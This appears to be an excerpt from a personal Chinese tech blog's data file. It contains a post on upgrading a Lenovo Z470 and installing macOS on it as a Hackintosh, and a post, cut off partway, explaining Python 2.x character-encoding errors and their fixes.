11年入手了一台联想Z470，到现在也有些年头了，当年是看中了它的外观，现在想来性能是它的短板。然而为了工作需要，我便又购置了一台高性能电脑。现如今便想着怎么处理这台小Z，有人建议当废品出售，但无论如何它都跟了我这么多年，舍弃有些不忍。抱着勤俭持家的态度，我便狠了狠心决定多花点钱，将它全面更新升级。在上网找了些资料后，便开始整理思路，汇总如下：</p>\n<ul>\n<li>更新内容：将原有部分硬件换新（声卡、网卡、外壳、键盘等）</li>\n<li>升级内容：内存加到8G，添加固态硬盘</li>\n<li>系统更换：黑化之苹果系统</li>\n</ul>\n<p>　　这其中最繁琐的要数装黑苹果系统，技术含量比较高，前2个比较好实现（只要花钱）。有了目标，便开始淘宝购买物件吧，前后大概花了800多，终于凑齐了所有所需之物，好了，那么便开始吧！</p>\n<h3 id=\"更换升级零件\"><a href=\"#更换升级零件\" class=\"headerlink\" title=\"更换升级零件\"></a>更换升级零件</h3><p>　　对于物件更换，这里不多介绍，只要会拆机就行，拆机之前多上网查查机型，根据教程来，不要盲目拆机。<br>　　加内存条也比较简单，也是先查询机型兼容的内存条型号，购买相应的装入即可。<br>　　至于安装SSD（固态硬盘），我的做法是将光驱拆下，将原有的机械硬盘放到光驱（需要购买托盘），再将SSD装入原先机械硬盘处即可。<br>　　以上一切做完之后，小Z已经从硬件上进行了全面大升级（显卡跟CPU不建议更改，可能会使主板损坏，其提升效果不明显）。接下来就是本文重点，更换苹果系统。</p>\n<h3 id=\"安装黑苹果\"><a href=\"#安装黑苹果\" class=\"headerlink\" title=\"安装黑苹果\"></a>安装黑苹果</h3><h4 id=\"准备阶段\"><a href=\"#准备阶段\" class=\"headerlink\" title=\"准备阶段\"></a>准备阶段</h4><ul>\n<li>第一：上网查资料，上网查资料，上网查资料。。。。。重要的事情多说几遍，要学会自己查找答案。</li>\n<li>第二：查找对应机型的电脑是否有安装黑苹果成功的案例，如果没有，那么我觉得是时候放弃了（除非是专门研究黑苹果的技术男，不然不要轻易去试）。我算运气比较好的，上网查了一圈，发现有不少小Z安装黑苹果成功的案例。</li>\n<li>第三：根据网上成功的教程，下载好所需的软件，复制网上成功的路线。<br>  所需软件：<ul>\n<li>变色龙引导程序</li>\n<li>懒人版镜像</li>\n<li>硬盘助手</li>\n<li>HFS</li>\n<li>DiskGenius Pro 4.30</li>\n<li>……</li>\n</ul>\n</li>\n</ul>\n<p>准备工作都弄好了，那么可以开始动手干了！</p>\n<h5 id=\"安装变色龙引导程序\"><a href=\"#安装变色龙引导程序\" class=\"headerlink\" title=\"安装变色龙引导程序\"></a>安装变色龙引导程序</h5><p><img src=\"/upload_image/20170213/1.png\" alt=\"\"><br>以管理员身份打开：<br><img src=\"/upload_image/20170213/2.png\" alt=\"\"><br>　　如果点击安装，没有反应，则需要打开电脑磁盘管理（右击计算机，管理），给那个100M的隐藏磁盘分配盘符（注意不能分配A盘符，其余的盘符都可以分配），分配完后，重新打开变色龙安装程序，重新安装。安装完成后，会在C盘或者100M的系统隐藏盘生成3个隐藏文件。<br><img src=\"/upload_image/20170213/3.png\" alt=\"\"><br>这3个文件是变色龙的引导文件。</p>\n<h5 id=\"安装HFS\"><a href=\"#安装HFS\" class=\"headerlink\" title=\"安装HFS\"></a>安装HFS</h5><p><img src=\"/upload_image/20170213/4.png\" alt=\"\"><br>直接双击运行，一路安装，具体作用自行百度吧。</p>\n<h5 id=\"给电脑分区\"><a href=\"#给电脑分区\" class=\"headerlink\" title=\"给电脑分区\"></a>给电脑分区</h5><p>首先分配一个8G大小的区，注意不要格式化。（用来放OSX安装程序，相当于硬盘安装盘）<br>然后再分配个大小不上限的区，注意不要格式化。（用来安装OSX，相当于windows的C盘）</p>\n<h5 id=\"打开硬盘助手\"><a href=\"#打开硬盘助手\" class=\"headerlink\" title=\"打开硬盘助手\"></a>打开硬盘助手</h5><p><img src=\"/upload_image/20170213/5.png\" alt=\"\"><br>将下载好的系统盘（我用的是懒人版，7.5G大小），写入刚分配好的8G大小的磁盘中，需要等到几分钟。。。</p>\n<h5 id=\"DiskGenius-Pro-4-30（查看磁盘状态工具）\"><a href=\"#DiskGenius-Pro-4-30（查看磁盘状态工具）\" class=\"headerlink\" title=\"DiskGenius Pro 4.30（查看磁盘状态工具）\"></a>DiskGenius Pro 4.30（查看磁盘状态工具）</h5><p><img src=\"/upload_image/20170213/6.png\" alt=\"\"><br>将刚才分的2个磁盘（8G，不上限大小），标识都设置为AF。右击更改参数，直接改为AF。</p>\n<h5 id=\"将EFI文件放入安装盘根目录\"><a href=\"#将EFI文件放入安装盘根目录\" class=\"headerlink\" title=\"将EFI文件放入安装盘根目录\"></a>将EFI文件放入安装盘根目录</h5><p><img src=\"/upload_image/20170213/7.png\" alt=\"\"><br>即放在那个8G大小的盘根目录。<br>注意：如果打开资源管理器，看不到8G的那个磁盘，可以重启电脑再看看。实在没有，估计是磁盘分区有问题，可能就需要重装系统了。</p>\n<h5 id=\"EDID注入\"><a href=\"#EDID注入\" class=\"headerlink\" title=\"EDID注入\"></a>EDID注入</h5><p>EFI下面有一个config.split文件，需要替换成自己电脑的edid（替换方法自行百度），这个文件是clover引导的配置文件，至关重要。</p>\n<h5 id=\"将Clover-iso替换wowpc-iso\"><a href=\"#将Clover-iso替换wowpc-iso\" class=\"headerlink\" title=\"将Clover.iso替换wowpc.iso\"></a>将Clover.iso替换wowpc.iso</h5><p>将clover.iso重命名为wowpc.iso，然后替换C盘或者隐藏盘下的wowpc.iso。这样变色龙引导会直接跳转到clover引导。</p>\n<h4 id=\"安装阶段\"><a href=\"#安装阶段\" class=\"headerlink\" title=\"安装阶段\"></a>安装阶段</h4><p>　　安装的过程中，最主要的是看会不会卡logo，或者黑屏。如果出现这2种情况，绝大部分原因是config.split配置文件的问题。如果一切正常，那么会成功进入安装界面，在选择安装到哪个盘时，要先选择菜单栏上的磁盘工具找到那个分配的准备拿来存放OSX系统的磁盘，选择抹掉，格式为OS（日志格式），再回到安装界面，就会发现可以选择那个磁盘进行安装了。</p>\n<h4 id=\"驱动配置\"><a href=\"#驱动配置\" class=\"headerlink\" title=\"驱动配置\"></a>驱动配置</h4><p>　　等到安装完成，就差不多可以用了，但是无线网卡驱动跟声音驱动还没有弄好。<br>　　安装无线网卡驱动：改无线网卡2a为2b，方法为finder进10.11系统盘system/library/extensions/,找到IO82011Family.kext，右键显示包内容找到/contents/Pluglus/AirportAtheros40.kext，继续右键显示包内容，找到contents/Info.pilst，用plistEdit Pro（自行百度安装该软件）打开，找到：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;array&gt;</div><div class=\"line\">        &lt;string&gt;pci168c,30&lt;/string&gt;</div><div class=\"line\">        &lt;string&gt;pci168c,2a&lt;/string&gt;</div><div class=\"line\">        &lt;string&gt;pci106b,0086&lt;/string&gt;</div><div class=\"line\">        &lt;string&gt;pci168c,1c&lt;/string&gt;</div><div class=\"line\">        &lt;string&gt;pci168c,23&lt;/string&gt;</div><div class=\"line\">        &lt;string&gt;pci168c,24&lt;/string&gt;</div><div class=\"line\">&lt;/array&gt;</div></pre></td></tr></table></figure></p>\n<p>代码，将第三行里面的2a改为2b，保存退出，之后用KCPM Utility Pro.app修复重建缓存<br>，重启。重启之后无线网卡应该能成功驱动了。<br>　　安装声卡驱动：即AppleHDA.kext驱动，删除system/library/extensions/AppleHDA.kext后，用KCPM Utility Pro进行安装，路径也为system/library/extensions/，安装完成之后重建缓存即可。</p>\n<h4 id=\"截图见证\"><a href=\"#截图见证\" class=\"headerlink\" title=\"截图见证\"></a>截图见证</h4><p><img src=\"/upload_image/20170213/8.png\" alt=\"\"><br><img src=\"/upload_image/20170213/9.png\" alt=\"\"></p>\n<p><em>提醒：以上过程只适用于联想Z470，其他机型请上网查资料……</em></p>\n<p>参考：<a href=\"http://bbs.pcbeta.com/viewthread-1662315-1-1.html\" target=\"_blank\" rel=\"external\">远景论坛</a></p>\n","excerpt":"","more":"<p>　　11年入手了一台联想Z470，到现在也有些年头了，当年是看中了它的外观，现在想来性能是它的短板。然而为了工作需要，我便又购置了一台高性能电脑。现如今便想着怎么处理这台小Z，有人建议当废品出售，但无论如何它都跟了我这么多年，舍弃有些不忍。抱着勤俭持家的态度，我便狠了狠心决定多花点钱，将它全面更新升级。在上网找了些资料后，便开始整理思路，汇总如下：</p>\n<ul>\n<li>更新内容：将原有部分硬件换新（声卡、网卡、外壳、键盘等）</li>\n<li>升级内容：内存加到8G，添加固态硬盘</li>\n<li>系统更换：黑化之苹果系统</li>\n</ul>\n<p>　　这其中最繁琐的要数装黑苹果系统，技术含量比较高，前2个比较好实现（只要花钱）。有了目标，便开始淘宝购买物件吧，前后大概花了800多，终于凑齐了所有所需之物，好了，那么便开始吧！</p>\n<h3 id=\"更换升级零件\"><a href=\"#更换升级零件\" class=\"headerlink\" title=\"更换升级零件\"></a>更换升级零件</h3><p>　　对于物件更换，这里不多介绍，只要会拆机就行，拆机之前多上网查查机型，根据教程来，不要盲目拆机。<br>　　加内存条也比较简单，也是先查询机型兼容的内存条型号，购买相应的装入即可。<br>　　至于安装SSD（固态硬盘），我的做法是将光驱拆下，将原有的机械硬盘放到光驱（需要购买托盘），再将SSD装入原先机械硬盘处即可。<br>　　以上一切做完之后，小Z已经从硬件上进行了全面大升级（显卡跟CPU不建议更改，可能会使主板损坏，其提升效果不明显）。接下来就是本文重点，更换苹果系统。</p>\n<h3 id=\"安装黑苹果\"><a href=\"#安装黑苹果\" class=\"headerlink\" title=\"安装黑苹果\"></a>安装黑苹果</h3><h4 id=\"准备阶段\"><a href=\"#准备阶段\" class=\"headerlink\" title=\"准备阶段\"></a>准备阶段</h4><ul>\n<li>第一：上网查资料，上网查资料，上网查资料。。。。。重要的事情多说几遍，要学会自己查找答案。</li>\n<li>第二：查找对应机型的电脑是否有安装黑苹果成功的案例，如果没有，那么我觉得是时候放弃了（除非是专门研究黑苹果的技术男，不然不要轻易去试）。我算运气比较好的，上网查了一圈，发现有不少小Z安装黑苹果成功的案例。</li>\n<li>第三：根据网上成功的教程，下载好所需的软件，复制网上成功的路线。<br>  所需软件：<ul>\n<li>变色龙引导程序</li>\n<li>懒人版镜像</li>\n<li>硬盘助手</li>\n<li>HFS</li>\n<li>DiskGenius Pro 4.30</li>\n<li>……</li>\n</ul>\n</li>\n</ul>\n<p>准备工作都弄好了，那么可以开始动手干了！</p>\n<h5 id=\"安装变色龙引导程序\"><a href=\"#安装变色龙引导程序\" class=\"headerlink\" title=\"安装变色龙引导程序\"></a>安装变色龙引导程序</h5><p><img src=\"/upload_image/20170213/1.png\" alt=\"\"><br>以管理员身份打开：<br><img src=\"/upload_image/20170213/2.png\" alt=\"\"><br>　　如果点击安装，没有反应，则需要打开电脑磁盘管理（右击计算机，管理），给那个100M的隐藏磁盘分配盘符（注意不能分配A盘符，其余的盘符都可以分配），分配完后，重新打开变色龙安装程序，重新安装。安装完成后，会在C盘或者100M的系统隐藏盘生成3个隐藏文件。<br><img src=\"/upload_image/20170213/3.png\" alt=\"\"><br>这3个文件是变色龙的引导文件。</p>\n<h5 id=\"安装HFS\"><a href=\"#安装HFS\" class=\"headerlink\" title=\"安装HFS\"></a>安装HFS</h5><p><img src=\"/upload_image/20170213/4.png\" alt=\"\"><br>直接双击运行，一路安装，具体作用自行百度吧。</p>\n<h5 id=\"给电脑分区\"><a href=\"#给电脑分区\" class=\"headerlink\" title=\"给电脑分区\"></a>给电脑分区</h5><p>首先分配一个8G大小的区，注意不要格式化。（用来放OSX安装程序，相当于硬盘安装盘）<br>然后再分配个大小不上限的区，注意不要格式化。（用来安装OSX，相当于windows的C盘）</p>\n<h5 id=\"打开硬盘助手\"><a href=\"#打开硬盘助手\" class=\"headerlink\" title=\"打开硬盘助手\"></a>打开硬盘助手</h5><p><img src=\"/upload_image/20170213/5.png\" alt=\"\"><br>将下载好的系统盘（我用的是懒人版，7.5G大小），写入刚分配好的8G大小的磁盘中，需要等到几分钟。。。</p>\n<h5 id=\"DiskGenius-Pro-4-30（查看磁盘状态工具）\"><a href=\"#DiskGenius-Pro-4-30（查看磁盘状态工具）\" class=\"headerlink\" title=\"DiskGenius Pro 4.30（查看磁盘状态工具）\"></a>DiskGenius Pro 4.30（查看磁盘状态工具）</h5><p><img src=\"/upload_image/20170213/6.png\" alt=\"\"><br>将刚才分的2个磁盘（8G，不上限大小），标识都设置为AF。右击更改参数，直接改为AF。</p>\n<h5 id=\"将EFI文件放入安装盘根目录\"><a href=\"#将EFI文件放入安装盘根目录\" class=\"headerlink\" title=\"将EFI文件放入安装盘根目录\"></a>将EFI文件放入安装盘根目录</h5><p><img src=\"/upload_image/20170213/7.png\" alt=\"\"><br>即放在那个8G大小的盘根目录。<br>注意：如果打开资源管理器，看不到8G的那个磁盘，可以重启电脑再看看。实在没有，估计是磁盘分区有问题，可能就需要重装系统了。</p>\n<h5 id=\"EDID注入\"><a href=\"#EDID注入\" class=\"headerlink\" title=\"EDID注入\"></a>EDID注入</h5><p>EFI下面有一个config.split文件，需要替换成自己电脑的edid（替换方法自行百度），这个文件是clover引导的配置文件，至关重要。</p>\n<h5 id=\"将Clover-iso替换wowpc-iso\"><a href=\"#将Clover-iso替换wowpc-iso\" class=\"headerlink\" title=\"将Clover.iso替换wowpc.iso\"></a>将Clover.iso替换wowpc.iso</h5><p>将clover.iso重命名为wowpc.iso，然后替换C盘或者隐藏盘下的wowpc.iso。这样变色龙引导会直接跳转到clover引导。</p>\n<h4 id=\"安装阶段\"><a href=\"#安装阶段\" class=\"headerlink\" title=\"安装阶段\"></a>安装阶段</h4><p>　　安装的过程中，最主要的是看会不会卡logo，或者黑屏。如果出现这2种情况，绝大部分原因是config.split配置文件的问题。如果一切正常，那么会成功进入安装界面，在选择安装到哪个盘时，要先选择菜单栏上的磁盘工具找到那个分配的准备拿来存放OSX系统的磁盘，选择抹掉，格式为OS（日志格式），再回到安装界面，就会发现可以选择那个磁盘进行安装了。</p>\n<h4 id=\"驱动配置\"><a href=\"#驱动配置\" class=\"headerlink\" title=\"驱动配置\"></a>驱动配置</h4><p>　　等到安装完成，就差不多可以用了，但是无线网卡驱动跟声音驱动还没有弄好。<br>　　安装无线网卡驱动：改无线网卡2a为2b，方法为finder进10.11系统盘system/library/extensions/,找到IO82011Family.kext，右键显示包内容找到/contents/Pluglus/AirportAtheros40.kext，继续右键显示包内容，找到contents/Info.pilst，用plistEdit Pro（自行百度安装该软件）打开，找到：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;array&gt;</div><div class=\"line\">        &lt;string&gt;pci168c,30&lt;/string&gt;</div><div class=\"line\">        &lt;string&gt;pci168c,2a&lt;/string&gt;</div><div class=\"line\">        &lt;string&gt;pci106b,0086&lt;/string&gt;</div><div class=\"line\">        &lt;string&gt;pci168c,1c&lt;/string&gt;</div><div class=\"line\">        &lt;string&gt;pci168c,23&lt;/string&gt;</div><div class=\"line\">        &lt;string&gt;pci168c,24&lt;/string&gt;</div><div class=\"line\">&lt;/array&gt;</div></pre></td></tr></table></figure></p>\n<p>代码，将第三行里面的2a改为2b，保存退出，之后用KCPM Utility Pro.app修复重建缓存<br>，重启。重启之后无线网卡应该能成功驱动了。<br>　　安装声卡驱动：即AppleHDA.kext驱动，删除system/library/extensions/AppleHDA.kext后，用KCPM Utility Pro进行安装，路径也为system/library/extensions/，安装完成之后重建缓存即可。</p>\n<h4 id=\"截图见证\"><a href=\"#截图见证\" class=\"headerlink\" title=\"截图见证\"></a>截图见证</h4><p><img src=\"/upload_image/20170213/8.png\" alt=\"\"><br><img src=\"/upload_image/20170213/9.png\" alt=\"\"></p>\n<p><em>提醒：以上过程只适用于联想Z470，其他机型请上网查资料……</em></p>\n<p>参考：<a href=\"http://bbs.pcbeta.com/viewthread-1662315-1-1.html\">远景论坛</a></p>\n"},{"title":"解决Python2.x编码之殇","date":"2017-02-16T04:55:57.000Z","_content":"　　Python编码问题一直困扰了我许久，之前有过一些总结，但并不系统，比较凌乱。当然python2.x编码问题本身，便是剪不断理还乱。本篇将系统介绍python2.x编程中会遇到的一些编码问题，并给出解决方案。基于对编码问题的摸索了解，我也尝试写了一个编码转换模块[Transcode](https://github.com/tengzhangchao/Transcode)，应该能解决绝大部分新手的疑难杂症。当然，python大神可以绕道而行，至于使用3.x的朋友，以后将会成文介绍。\n　　python编程中会经常遇到操作系统编码、文件编码、控制台输入输出编码、网页编码、源代码编码、python编码，本文将会逐一介绍。首先我们来看看一些常见的编码情况：\n```bash\nprint sys.getdefaultencoding()    #系统默认编码\nprint sys.getfilesystemencoding() #文件系统编码\nprint locale.getdefaultlocale()   #系统当前编码\nprint sys.stdin.encoding          #终端输入编码\nprint sys.stdout.encoding         #终端输出编码\n```\n将以上这段代码在windows与linux系统下分别运行，查看输出结果。\nwindows终端结果:\n```bash\nascii\nmbcs\n('zh_CN', 'cp936')\ncp936\ncp936\n```\nLinux终端结果：\n```bash\nascii\nUTF-8\n('zh_CN', 'UTF-8')\nUTF-8\nUTF-8\n```\n### 操作系统编码\n　　操作系统默认编码可以通过sys.getdefaultencoding()函数获取，可以看到windows与linux下默认都为ascii编码，而我们知道ascii编码不支持中文。那么操作系统编码将在python程序的何处会被用到呢？何时又会引发血案？\n\n#### 触发异常点\n　　经过测试，我发现当需要将unicode格式的字符串存入到文件时，python内部会默认将其先转换为Str格式的系统编码，然后再执行存入步骤。而在这过程中，容易引发ascii异常。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=u\"中文\"\nf=open(\"test.txt\",\"w\")\nf.write(a)\n```\n报错异常信息：UnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1......\n说明：因为ascii不支持中文，而变量a为unicode格式的中文字符串，因此无法进行编码而引发异常。\n\n#### 解决方案\n设置系统编码为utf-8或者gbk。\n```bash\nimport sys\nreload(sys)\nsys.setdefaultencoding('gbk')\n```\n说明：在windows下将其设置为gbk，在linux在设置为utf-8.\n\n### 终端编码\n　　windows下终端指的是控制台，在控制台上输入输出有着其本身的编码格式，如windows控制台输入输出编码都为cp936。原谅我是第一次看到此编码，于是上网查了会，发现其实它就是常见的GBK编码；而linux终端的输入输出编码都为utf-8。如果我们编写的程序，不会再终端输入输出任何内容，则可以忽略此编码，如若不然终端编码将会非常重要。\n\n#### 乱码点\n我们在终端执行python脚本时，经常会遇到输出中文乱码，而这往往是因为输出的字符串本身编码与控制台编码不一致。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=\"中文\"  #定义一个变量，默认为Str，utf-8编码\nprint a\nprint type(a)\n```\nwindows控制台输出结果：\n```bash\n浣犲ソ\n<type 'str'>\n```\nlinux终端输出结果：\n```bash\n中文\n<type 'str'>\n```\n造成这种差异的原因在于windows控制台为gbk编码，而变量a本身为utf-8编码。\n\n#### 解决方案\n```bash\n#! -*- coding:utf-8 -*-\na='你好'\nb=a.decode(\"utf-8\").encode(\"gbk\")\nprint b\n```\n将变量a从utf-8编码转换为gbk编码。\n\n### python编码\n　　python2.x从外部获取的内容都是string编码，其内部分为String编码与Unicode编码，而String编码又分为UTF-8，GBK，GB2312等等。因此为了避免不同编码造成的报错，python内部最好都转化为unicode编码，在输出时再转化为str编码 。可以用encode()/decode()函数，将string与unicode编码互换。\n\n#### 触发异常点\n基本在于python内部变量编码与控制台编码，或者其他编码相结合时触发。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=\"中文\"  #定义一个变量，默认为str，utf-8编码\nprint a\nprint type(a)\n```\n运行结果：\n```bash\n浣犲ソ\n<type 'str'>\n```\n　　说明：windows下控制台输入输出都是gbk编码格式，而代码中定义的变量a为str，utf-8格式，所以会出现乱码。如果想创建一个unicode编码字符串的变量，则可以a=u\"123\"，在双引号前面加上一个u，表示a为unicode编码。\n\n#### 解决方案\n```bash\n#! -*- coding:utf-8 -*-\na='你好'\nprint a.decode(\"utf-8\").encode(\"gbk\")\n```\n　　说明：首先我们定义的变量a是str格式，编码为utf-8的字符串，我们要将之转化为str格式，GBK编码的字符串。在python内部无法直接转化，需要借助decod()与encode()函数。decode()函数先将str格式的字符串a转化为unicode，再将unicode编码为str格式GBK。而在Unix系统下，不存在这个问题，因为都是utf-8编码，不会存在乱码。print语句默认会将unicode编码的字符串，encode为相应系统的str编码并输出（windows下为gbk,unix下为utf-8）,因此不用担心print unicode编码字符串会报错。\n\n### 源代码编码\n源代码编码指的是python程序本身的编码，默认为ascii。\n\n#### 触发异常点\n　　python程序本身要被解释器解析执行，需要先被转化为二进制代码。而在这过程中容易引发异常，原因同样是ascii不支持中文，因此当python程序中出现中文时，哪怕是注释，也会引发ascii异常。\n实例证明：\n```bash\nprint \"中文\"  #中文注释\n```\n报错：SyntaxError: Non-ASCII character '\\xe7'......\n\n#### 解决方案\n```bash\n#! -*- coding:utf-8 -*-\n```\npython程序开头加上这句代码，指定python源代码编码格式为utf-8。\n\n### 文件编码\n　　文件编码指的是，python程序从文件中获取的内容的编码格式。可以用sys.getfilesystemencoding()函数获取，windows下为mbcs，linux下为utf-8。至于mbcs，是一种多字节编码（没搞很明白）。\n\n#### 触发异常点（读取文件内容）\n当python程序从文件中获取内容，并输出时，容易触发异常。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\nf=open(\"test.txt\",\"r\")\ncontent=f.read()\nprint type(content)\nprint content\n```\n运行结果：\n```bash\n<type 'str'>\n你好\n```\n　　可以看到windows下，从文件中读取的编码格式为Str，GBK格式（因为控制台输出没有中文乱码）；而在Unix下为Str，Utf-8格式。从输出内容来说，并没有触发异常，然而当这些内容与python程序自身内容相结合时，容易触发异常。\n\n#### 解决方案\n在windows下，最好将文件内容转为unicode，可以使用codecs：\n```bash\nf=codecs.open(\"test.txt\", encoding='gbk').read()\n```\n将格式为gbk的文件内容转化为unicode格式，当然也可以直接使用open(\"\",\"r\").read().decode(\"gbk\")\n\n#### 触发异常点（写入文件内容）\n参考操作系统编码触发异常点，即将中文unicode字符写入文件时，容易触发异常。\n\n#### 解决方案\n参考操作系统编码解决方案，或者手动将unicode编码转换为str编码。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=u\"中文\"  #a为unicode格式编码\nf=open(\"test.txt\",\"w\")\nf.write(a.encode(\"gbk\"))\n```\n当然如果变量a本身就是Str则不会报错，只是utf-8编码的内容写入windows文件中，显示会乱码。\n\n### 网页编码\n　　网页编码，通常在写爬虫的时候经常遇到，再结合系统编码，python编码，文件编码，往往会搞得一团乱。在程序中我们应该分别处理这些编码，在python内部全部转化为unicode。那么网页编码又有哪些格式呢？\n常见格式：utf-8，gbk，gb2312\n#### 触发异常点\n还是在于从网页中获取的源码编码与终端编码，甚至python内部编码不一致的情况。\n实例证明：\n```bash\n#!coding=utf-8\nimport urllib2\nbody=urllib2.urlopen('http://thief.one').read()\nprint type(body)\nprint body\n```\n运行结果：\n```bash\n<type 'str'>\nbody中文显示乱码\n```\n说明：这个网站的编码是utf-8，而且python从网页上爬取的内容都为Str格式，在windows控制台下输出会乱码。\n\n#### 解决方案\n　　依照之前做法，先将其转化为unicode。而相应的正则也可以为unicode编码，如：res=r''+u\"新成员\"。可以通过chardet模块判断网页编码类型，返回的是一个带概率的字典。\n\n### 编码判断\n#### 判断字符串编码\n```bash\nisinstance(obj, (str, unicode))\n```\n返回True或者False\n#### 判断网页编码\n```bash\nimport chardet\nimport urllib2\nbody=urllib2.urlopen(\"http://thief.one\").read()\nchardet.detect(body)\n```\n判断编码格式，会有百分比，一般用来判断网页编码比较好。\n\n#### 判断系统编码\n```bash\nprint sys.getdefaultencoding()    #系统默认编码\nprint sys.getfilesystemencoding() #文件系统编码\nprint locale.getdefaultlocale()   #系统当前编码\nprint sys.stdin.encoding          #终端输入编码\nprint sys.stdout.encoding         #终端输出编码\n```\n### python2.x编码建议\n\n* 请尽量在Linux系统上编程，综上我们可以知道linux下较windows，编码问题良好很多。\n* python代码内部请全部使用unicode编码，在获取外部内容时，先decode为unicode，向外输出时再encode为Str\n* 在定义变量或者正则时，也定义unicode字符，如a=u\"中文\"；res=r\"\"+u\"正则\"。\n\n### 其他疑难杂症\n实例一：\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\"\nprint a\n```\n变量a的内容本身为unicode编码，怎么正常显示输入？\n解决方案：\n```bash\na=\"\\\\u8fdd\\\\u6cd5\\\\u8fdd\\\\u89c4\" # unicode转化为中文\nb=a.decode('unicode-escape')\nprint b\n```\n<hr>\n　　如果阅读完本章，增加了您对python编码问题的认识，那我会感到欣慰，如有python编码上的问题可以在下方留言。\n　　如果阅读完本章，您仍然不知如何解决python乱码问题，没关系，请继续移步阅读[Transcode解决python编码问题](https://github.com/tengzhangchao/Transcode)\n\n*　　为了能够让您重视，我不得不再次重申：解决python2.x编码问题的关键，在于要明白无论从哪里来的内容，在python内部流通时，都应该先转换为unicode。（python3.x在这方面做了改进，并取得了很好的效果）*\n\n<center>*技术的探索，就好像编织故事一般，其乐趣在于偶尔能够讲述给别人听，并获得一些赞同！*</center>\n","source":"_posts/解决Python2-x编码之殇.md","raw":"---\ntitle: 解决Python2.x编码之殇\ndate: 2017-02-16 12:55:57\ntags: python编码问题\ncategories: 编程之道\n---\n　　Python编码问题一直困扰了我许久，之前有过一些总结，但并不系统，比较凌乱。当然python2.x编码问题本身，便是剪不断理还乱。本篇将系统介绍python2.x编程中会遇到的一些编码问题，并给出解决方案。基于对编码问题的摸索了解，我也尝试写了一个编码转换模块[Transcode](https://github.com/tengzhangchao/Transcode)，应该能解决绝大部分新手的疑难杂症。当然，python大神可以绕道而行，至于使用3.x的朋友，以后将会成文介绍。\n　　python编程中会经常遇到操作系统编码、文件编码、控制台输入输出编码、网页编码、源代码编码、python编码，本文将会逐一介绍。首先我们来看看一些常见的编码情况：\n```bash\nprint sys.getdefaultencoding()    #系统默认编码\nprint sys.getfilesystemencoding() #文件系统编码\nprint locale.getdefaultlocale()   #系统当前编码\nprint sys.stdin.encoding          #终端输入编码\nprint sys.stdout.encoding         #终端输出编码\n```\n将以上这段代码在windows与linux系统下分别运行，查看输出结果。\nwindows终端结果:\n```bash\nascii\nmbcs\n('zh_CN', 'cp936')\ncp936\ncp936\n```\nLinux终端结果：\n```bash\nascii\nUTF-8\n('zh_CN', 'UTF-8')\nUTF-8\nUTF-8\n```\n### 操作系统编码\n　　操作系统默认编码可以通过sys.getdefaultencoding()函数获取，可以看到windows与linux下默认都为ascii编码，而我们知道ascii编码不支持中文。那么操作系统编码将在python程序的何处会被用到呢？何时又会引发血案？\n\n#### 触发异常点\n　　经过测试，我发现当需要将unicode格式的字符串存入到文件时，python内部会默认将其先转换为Str格式的系统编码，然后再执行存入步骤。而在这过程中，容易引发ascii异常。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=u\"中文\"\nf=open(\"test.txt\",\"w\")\nf.write(a)\n```\n报错异常信息：UnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1......\n说明：因为ascii不支持中文，而变量a为unicode格式的中文字符串，因此无法进行编码而引发异常。\n\n#### 解决方案\n设置系统编码为utf-8或者gbk。\n```bash\nimport sys\nreload(sys)\nsys.setdefaultencoding('gbk')\n```\n说明：在windows下将其设置为gbk，在linux在设置为utf-8.\n\n### 终端编码\n　　windows下终端指的是控制台，在控制台上输入输出有着其本身的编码格式，如windows控制台输入输出编码都为cp936。原谅我是第一次看到此编码，于是上网查了会，发现其实它就是常见的GBK编码；而linux终端的输入输出编码都为utf-8。如果我们编写的程序，不会再终端输入输出任何内容，则可以忽略此编码，如若不然终端编码将会非常重要。\n\n#### 乱码点\n我们在终端执行python脚本时，经常会遇到输出中文乱码，而这往往是因为输出的字符串本身编码与控制台编码不一致。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=\"中文\"  #定义一个变量，默认为Str，utf-8编码\nprint a\nprint type(a)\n```\nwindows控制台输出结果：\n```bash\n浣犲ソ\n<type 'str'>\n```\nlinux终端输出结果：\n```bash\n中文\n<type 'str'>\n```\n造成这种差异的原因在于windows控制台为gbk编码，而变量a本身为utf-8编码。\n\n#### 解决方案\n```bash\n#! -*- coding:utf-8 -*-\na='你好'\nb=a.decode(\"utf-8\").encode(\"gbk\")\nprint b\n```\n将变量a从utf-8编码转换为gbk编码。\n\n### python编码\n　　python2.x从外部获取的内容都是string编码，其内部分为String编码与Unicode编码，而String编码又分为UTF-8，GBK，GB2312等等。因此为了避免不同编码造成的报错，python内部最好都转化为unicode编码，在输出时再转化为str编码 。可以用encode()/decode()函数，将string与unicode编码互换。\n\n#### 触发异常点\n基本在于python内部变量编码与控制台编码，或者其他编码相结合时触发。\n实例证明：\n```bash\n#! -*- coding:utf-8 -*-\na=\"中文\"  #定义一个变量，默认为str，utf-8编码\nprint a\nprint type(a)\n```\n运行结果：\n```bash\n浣犲ソ\n<type 'str'>\n```\n　　说明：windows下控制台输入输出都是gbk编码格式，而代码中定义的变量a为str，utf-8格式，所以会出现乱码。如果想创建一个unicode编码字符串的变量，则可以a=u\"123\"，在双引号前面加上一个u，表示a为unicode编码。\n\n#### 解决方案\n```bash\n#! -*- coding:utf-8 -*-\na='你好'\nprint a.decode(\"utf-8\").encode(\"gbk\")\n```\n　　